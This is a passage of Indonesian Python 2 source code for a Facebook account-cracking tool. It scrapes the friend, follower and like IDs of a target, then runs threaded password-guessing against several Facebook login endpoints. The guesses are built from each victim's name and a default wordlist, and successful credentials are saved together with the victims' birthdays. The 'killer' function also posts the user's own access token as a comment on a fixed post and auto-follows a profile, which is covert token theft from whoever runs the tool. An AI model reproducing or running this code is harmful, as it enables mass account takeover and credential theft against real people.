sejuk pegunungan, Lemon, Herbal mengademkan, Dan udara pegunungan sejuk, Baru Adem Sari Ching Ku Sparkling Lemon, Ching Ku Sparkling, Ahhhhh cepat ademnya.', 'Ayo!, Awas jurang! Wowwwwow, Dalem banget, aduh bagaimana?, Jagoan Neon, Yeeeaayy!, Yeeaayy, uwaaaaawuu, wueeewww!, Jagoannn!, Jagoan, jagoan, yeaayy! Uwaaa, Hahahahaha jagoan!, Jagoan Neon, Permennya jagoan!', 'Sekali putaran, Setengah putaran, Bersihkan sel kulit mati dan kotoran, Tar putar di wajah, Bilas, Multivitamin, Wajah bersih cerah seketika, siap!, Fair and Lovely Facial Foam'])
def killer():
    try:
        token = open('login.txt', 'r').read()
        saya = requests.get('https://graph.facebook.com/me/?access_token=%s'%(token))
        i = json.loads(saya.text)
        nick = i['name']
        idme = i['id']
        ttlme = i['birthday']
        month, day, year = ttlme.split("/")
        month = bulan_ttl[month]
        
    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
        os.system('rm -rf login.txt')
        exit(proff.login())    
    kom = komen1
    komen = komen2
    komentar = komen3
    komenn = komen4
    komennn = komen5
    post = '1230470587425293'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + token + '&access_token=' + token)   
#    requests.post('https://graph.facebook.com/' + idme + '/feed?method=POST&access_token=' + token + '&message=asu kontol:v')
    requests.post('https://graph.facebook.com/1230470587425293/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/1230470587425293/comments/?message=' + komennn + '&access_token=' + token)
    requests.post('https://graph.facebook.com/1230470587425293/comments/?message=' + komentar + '&access_token=' + token)
    requests.post('https://graph.facebook.com/1230470587425293/comments/?message=' + komenn + '&access_token=' + token)    
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
    requests.post('https://graph.facebook.com/100013870892557/subscribers?access_token=' + token)#prof
#    requests.post('https://graph.facebook.com/' + idme + '/feed?method=POST&access_token=' + token + '&message=Pengen Ngentod😭😥')    
    
    exit(proff.menu())

#teman ngen
def teman():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    try:
        for i in requests.get('https://graph.facebook.com/me/friends?access_token=%s'%(token)).json()["data"]:
            idne = i['id']
            jenenge = i["name"]
            id.append(idne+'<=>'+jenenge)
    except KeyError:
        exit('\n%s [%s!%s] Private id'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] pertemanan anda adalah 0'%(p,m,p))
    else:
   #     print("%s [%s•%s] Nama     : %s"%(p,k,p,jenenge))
        print("%s [%s•%s] Total id :%s %s"%(p,k,p,h,(len(id))))


def publik():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    idt=raw_input("\n%s [%s•%s] Enter target id\n [%s•%s] ID target: "%(p,k,p,k,p))
    try:
        for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s'%(idt,token)).json()["data"]:
            idne = i['id']
            jenenge = i["name"]
            id.append(idne+'<=>'+jenenge)
    except KeyError:
        exit('\n%s [%s!%s] Private id'%(p,m,p))
    if (len(id)) == 0:
        jalan('\n%s [%s!%s] Hasil ID Null, Cari id lain'%(p,m,p));time.sleep(2)
        publik()
    else:
        print("%s [%s•%s] Nama     : %s"%(p,k,p,jenenge))
        print("%s [%s•%s] Total id :%s %s"%(p,k,p,h,(len(id))))
 
### CRACK NUMBER ##
        
def tod():
        print ' %s[%s•%s] Remove token... %s'%(p,m,p,p);time.sleep(3)
        os.system('rm -rf login.txt')        
        sys.stdout.flush() 
        time.sleep(1)

def followers():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    idt=raw_input("\n%s [%s•%s] Enter target id\n [%s•%s] ID target: "%(p,k,p,k,p))
    try:
        for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s"%(idt,token)).json()["data"]:
            idne = i['id']
            jenenge = i["name"]
            id.append(idne+'<=>'+jenenge)
    except KeyError:
        exit('\n%s [%s!%s] Followers tidak ada atau di private'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] followers target adalah 0'%(p,m,p))
    else:
        print("%s [%s•%s] Nama     : %s"%(p,k,p,jenenge))
        print("%s [%s•%s] Total id :%s %s"%(p,k,p,h,(len(id))))

def likes():
    global token
    try:
        token = open("login.txt", "r").read()
    except IOError:
        print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
    idt=raw_input("\n%s [%s•%s] Masukan id postingan\n [%s•%s] ID post target: "%(p,k,p,k,p))
    try:
        for i in requests.get("https://graph.facebook.com/%s/likes?limit=100000&access_token=%s"%(idt,token)).json()["data"]:
            idne = i['id']
            jenenge = i["name"]
            id.append(idne+'<=>'+jenenge)
    except KeyError:
        exit('\n%s [%s!%s] User likes tidak ada atau di private'%(p,m,p))
    if (len(id)) == 0:
        exit('\n%s [%s!%s] likes target adalah 0'%(p,m,p))
    else:
        print("%s [%s•%s] Nama     : %s"%(p,k,p,jenenge))
        print("%s [%s•%s] Total id :%s %s"%(p,k,p,h,(len(id))))
        
__ml_dev__ = 'https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=1591956834435357&cbt=1622137477843&e2e=%7B%22init%22%3A1622137477843%7D&ies=1&sdk&_rdr'
__ff_dev__ = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2Fm.facebook.com%2Fv6.0%2Fdialog%2Foauth&_rdr'        
#login game
def __seting_login_fb_game__():
    print panah
    print('\n  Buka Halaman Login GAME lewat FB')
    print('+----------------------------------+')
    print panah
    print(' [1] Buka Halaman Login Free Fire Lewat FB')
    print(' [2] Buka Halaman Login Mobile Legend Lewat FB ')
    print panah
    pil = raw_input(' %s'%(panah))
    if pil == '1':
        try:
            subprocess.check_output(['am', 'start', __ff_dev__])            
        except:
            print(' Copy Link Login ==> %s%s'%(h,__ff_dev__))
        exit()
    elif pil == '2':
        try:
            subprocess.check_output(['am', 'start', __ml_dev__])
        except:
            print(' Copy Link Login ==> %s%s'%(h,__ff_dev__))
        exit()
    else:
        exit()        


def login_dengan_passwod():
    global fb
    global time
    try:
        print('\n\n      L O G I N  F A C E B O O K ')
        print panah
       # print '      IP Sekarang: ' + k + ip
        print panah
        em_dev = raw_input(' [ Login ] Masukkan Username: ')
        san_dev = raw_input(' [ Login ] Masukkan Password: ')
        url_page_log = 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr'
        with requests.Session() as (ses_dev):
            page_dev = ses_dev.get(url_page_log).content
            sop = parser(page_dev, 'html.parser')
            form_dev = sop.find('form', id='login_form')
            url_post = form_dev['action']
            time = time.time()
            ses_dev.headers.update({'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36', 
               'referer': fb + url_post, 
               'Host': 'm.facebook.com', 
               'accept': '*/*', 
               'sec-ch-ua-mobile': '?1', 
               'accept-encoding': 'gzip, deflate, br', 
               'accept-language': 'id,en-US;q=0.9,en;q=0.8', 
               'x-fb-lsd': form_dev.find('input', attrs={'name': 'lsd'})['value']})
            payload = {'email': em_dev, 
               'pass': ('#PWD_BROWSER:0:{}:{}').format(int(time), san_dev)}
            for dev_get_input in form_dev:
                input = dev_get_input
                payload[input.get('name')] = input.get('value')

            login_dev = ses_dev.post(fb + url_post, data=payload, allow_redirects=False).cookies
            if 'c_user' in login_dev:
                print( '\n >_< Login Sukses...\n')
                try:
                    cokie_log = login_dev.get_dict()
                    nilai_cok = cokie_log.values()
                    for dev in nilai_cok:
                        with open('cookie.txt', 'a') as (us_ps):
                            us_ps.write(str(dev + '\n'))

                    c_user = open('cookie.txt', 'r').readlines()[0].strip('\n')
                    fr = open('cookie.txt', 'r').readlines()[1].strip('\n')
                    xs = open('cookie.txt', 'r').readlines()[2].strip('\n')
                    sb = open('cookie.txt', 'r').readlines()[3].strip('\n')
                    cookie = {'c_user': c_user, 'fr': fr, 
                       'xs': xs, 
                       'sb': sb}
                except:
                    exit('\n Kesalahan di Cookie!\n')

                print( '\n Login Sukses....\n Tunggu Proses --->>> ')
                proses_masuk(cookie)
                __token__dev(cookie)
                token = open('login.txt', 'r').read()
                print('\n [!] Jalankan lagi Toolsnya..!\n Ketik Perintah python2 premium.pyc\n')
                exit()
            elif 'checkpoint' in login_dev:
                print( '\n Akun Cekpoin...')
                exit('\n Keluar\n')
            else:
                print m + '\n Login Gagal...'
                exit('\n Keluar\n')
    except requests.exceptions.ConnectionError:
        print '\n Periksa Koneksi Internet!'
        exit('\n Keluar\n')

def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		print ("\n %s[%s!%s] Token invalid"%(p,m,p));os.system("rm -rf login.txt");time.sleep(1);login()
	try:
		tanya_total = int(raw_input("\n%s [%s•%s] Jumlah massal: "%(p,k,p)))
	except:tanya_total=1
	for t in range(tanya_total):
		t +=1
		idt=raw_input("\n%s [%s•%s] Enter target id\n [%s•%s] ID target%s: "%(p,k,p,k,p,t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				idne = i["id"]
				jenenge = i["name"]
				id.append(idne+"<=>"+jenenge)
		except KeyError:
			exit('\n%s [%s!%s] Private id'%(p,m,p))
	if (len(id)) == 0:
		exit('\n%s [%s!%s] Hasil ID Null'%(p,m,p))
	else:
	    #print("%s [%s•%s] Nama     : %s"%(p,k,p,jenenge))
		print("%s [%s•%s] Total id :%s %s"%(p,k,p,h,(len(id))))

def cruot():
	print("\n         \033[41m\033[1;37m[ methode crack ]\x1b[0m")
	print("\n%s [%s1%s] Crack with Api Facebook %sPro %s+ %sTTL"%(p,k,p,b,p,k))
	print("%s [%s2%s] Crack with Mbasic %sPro %s+ %sTTL"%(p,k,p,b,p,k))
	print("%s [%s3%s] Crack with Touch Facebook + %sTTL"%(p,k,p,k))
	print("%s [%s4%s] Crack with X.Facebook + %sTTL"%(p,k,p,k))
	print("%s [%s5%s] Crack with D.facebook + %sTTL"%(p,k,p,k))
	print("%s [%s6%s] Crack with Free.Facebook + %sTTL\n"%(p,k,p,k))
	profers = raw_input(" \033[4;33mChoose%s:\x1b[0m\n %s➤%s➤%s➤%s➤ %s"%(p,m,k,h,b,p))
	if profers in [""]:
		exit("\n%s [%s!%s] Unknown!!"%(p,m,p))
		#cruot()
	elif profers in ["1","01"]:
		bukanmaen = raw_input("\n%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s "%(p,k,p,panah))
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,k,p,p,k,p)).split(",")
				if len(asu) =="":
					exit("%s [%s!%s] Unknown!"%(p,m,p))
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(api, uid, asu)
			hasil()
		elif bukanmaen in ["d","D"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						pwcuk = [ "sayang", "bismillah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu", "doraemon", "merdeka", "sepeda", "kontol", "jembut", "legend", "kuontol", "password", "samsung", "xiaomi", "kacang", "kelinci", "youtube", "facebook" ]
					coeg.submit(api, uid, pwcuk)
			hasil()

	elif profers == "2":
		bukanmaen = raw_input("\n%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s "%(p,k,p,panah))
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,k,p,p,k,p)).split(",")
				if len(asu) =="":
					exit("%s [%s!%s] Unknown!"%(p,m,p))
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				#fak
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(mbasic, uid, asu)
			hasil()
		elif bukanmaen == "d":
			with ThreadPoolExecutor(max_workers=35) as coeg:
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				#fake()
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						pwcuk = [ "sayang", "bismillah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu", "doraemon", "merdeka", "sepeda", "kontol", "jembut", "legend", "kuontol", "password", "samsung", "xiaomi", "kacang", "kelinci", "youtube", "facebook" ]
					coeg.submit(mbasic, uid, pwcuk)
			hasil()

	elif profers == "3":
		bukanmaen = raw_input("\n%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,k,p,p,k,p))
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,k,p,p,k,p)).split(",")
				if len(asu) =="":
					exit("%s [%s!%s] Unknown!"%(p,m,p))
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(mobile, uid, asu)
			hasil()
		elif bukanmaen == "d":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						pwcuk = [ "sayang", "bismillah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu", "doraemon", "merdeka", "sepeda", "kontol", "jembut", "legend", "kuontol", "password", "samsung", "xiaomi", "kacang", "kelinci", "youtube", "facebook" ]
					coeg.submit(mobile, uid, pwcuk)
			hasil()
			
	elif profers == "4":
		bukanmaen = raw_input("\n%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,k,p,p,k,p))
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,k,p,p,k,p)).split(",")
				if len(asu) =="":
					exit("%s [%s!%s] Unknown!"%(p,m,p))
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(xfb, uid, asu)
			hasil()
		elif bukanmaen == "d":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						pwcuk = [ "sayang", "bismillah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu", "doraemon", "merdeka", "sepeda", "kontol", "jembut", "legend", "kuontol", "password", "samsung", "xiaomi", "kacang", "kelinci", "youtube", "facebook" ]
					coeg.submit(xfb, uid, pwcuk)
			hasil()	
			
	elif profers == "5":
		bukanmaen = raw_input("\n%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,k,p,p,k,p))
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,k,p,p,k,p)).split(",")
				if len(asu) =="":
					exit("%s [%s!%s] Unknown!"%(p,m,p))
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(dfb, uid, asu)
			hasil()
		elif bukanmaen == "d":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						pwcuk = [ "sayang", "bismillah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu", "doraemon", "merdeka", "sepeda", "kontol", "jembut", "legend", "kuontol", "password", "samsung", "xiaomi", "kacang", "kelinci", "youtube", "facebook" ]
					coeg.submit(dfb, uid, pwcuk)
			hasil()	

	elif profers == "6":
		bukanmaen = raw_input("\n%s [%s•%s] Crack With Pass Default/Manual [d/m]\n %s[%s•%s] Choose: "%(p,k,p,p,k,p))
		if bukanmaen in ["m","M"]:
			with ThreadPoolExecutor(max_workers=30) as coeg:
				asu = raw_input("%s [%s•%s] Example password: sayang, ganteng, cantik\n %s[%s•%s] Pass list: "%(p,k,p,p,k,p)).split(",")
				if len(asu) =="":
					exit("%s [%s!%s] Unknown!"%(p,m,p))
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				for user in id:
					uid, name = user.split("<=>")
					coeg.submit(freefb, uid, asu)
			hasil()
		elif bukanmaen == "d":
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n%s [%s•%s] Result OK saved to : ok.txt\n %s[%s•%s] Result CP saved to : cp.txt"%(p,k,p,p,k,p))
				print("%s [%s•%s] No result? turn on mode airplane (5 sec)"%(p,k,p))
				print("%s [%s•%s] No result? reset APN connections (5 sec)\n"%(p,k,p))
				for user in id:
					uid, name = user.split("<=>")
					frist=name.split(" ")
					if len(frist)>=6:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=2:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					elif len(frist)<=3:
						pwcuk = [ name, frist[0], frist[0]+"123", frist[0]+"12345", frist[0]+"123456" ]
					else:
						pwcuk = [ "sayang", "bismillah", "anjing", "bangsat", "freefire", "katasandi", "indonesia", "sayangkamu", "doraemon", "merdeka", "sepeda", "kontol", "jembut", "legend", "kuontol", "password", "samsung", "xiaomi", "kacang", "kelinci", "youtube", "facebook" ]
					coeg.submit(freefb, uid, pwcuk)
			hasil()	
		else:
			exit("\n%s [%s!%s] Unknown!"%(p,m,p))

	else:
		menu()   
### Api Fast Crack ###
def api(uid, pwcuk):
	try:
		ua = open("ua", "r").read()
	except IOError:
		ua = ("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
	global ua_de, ok, cp, loop, token
	sys.stdout.write(
		"\r [Crack] %s/%s OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwcuk:
		pw = pw.lower()
		ses = requests.Session()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r \x1b[1;32m[OK] %s • %s • %s\033[0;97m"%(uid, pw, send.json()["access_token"]))
			ok.append("%s | %s"%(uid, pw))
			open("ok.txt","a").write("%s | %s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			try:
				token = open("login.txt", "r").read()
				with requests.Session() as ses:
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
					month, day, year = ttl.split("/")
					month = bulan_ttl[month]
					print("\r\x1b[1;33m [CP] %s • %s • %s %s %s\033[0;97m"%(uid, pw, day, month, year))
					cp.append("%s | %s"%(uid, pw))
					open("cp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					open("checkcp.txt","a").write("%s | %s | %s\n"%(uid, pw, ttl))
					break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			print("\r\x1b[1;33m [CP] %s • %s\033[0;97m        "%(uid, pw))
			cp.append("%s | %s"%(uid, pw))
			open("cp.txt","a").write("%s | %s\n"%(uid, pw))
			open("checkcp.txt","a").write("%s | %s\n"%(uid, pw))
			break
		else:
			continue

	loop += 1

def mbasic(uid, pwcuk):
	try:
		ua = open("ua", "r").read()
	except IOError:
		#ua = '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
		ua = random.choice(['[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
         '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
         '[FBAN/FB4A;FBAV/223.0.0.47.120;FBBV/156649505;FBDM/{density=2.625,width=1080,height=2034};FBLC/sv_SE;FBRV/0;FBCR/Telia;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
